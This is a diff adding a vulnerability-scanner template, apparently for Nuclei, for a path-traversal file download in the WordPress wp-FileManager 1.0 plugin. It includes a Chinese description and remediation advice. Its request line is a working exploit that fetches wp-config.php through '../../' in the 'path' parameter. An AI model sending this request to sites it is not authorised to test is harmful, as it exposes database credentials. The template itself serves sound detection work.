@@ -1,0 +1,31 @@
+id: CNVD-2013-06167
+info:
+  name: WordPress Plugin wp-FileManager_1.0_任意文件下载
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin wp-FileManager 'path' 参数任意文件下载漏洞
+
+    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。FileManager for WordPress插件可以更改、删除、组织、上传文件。
+
+    WordPress wp-FileManager插件存在安全漏洞。可使攻击者下载站点任意文件。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：http://wordpress.org/extend/plugins/wp-filemanager/
+
+    临时修复方案：
+    1、过滤\".\"，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"<?php") && contains(body,"wp-config")
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download'
+  method: GET
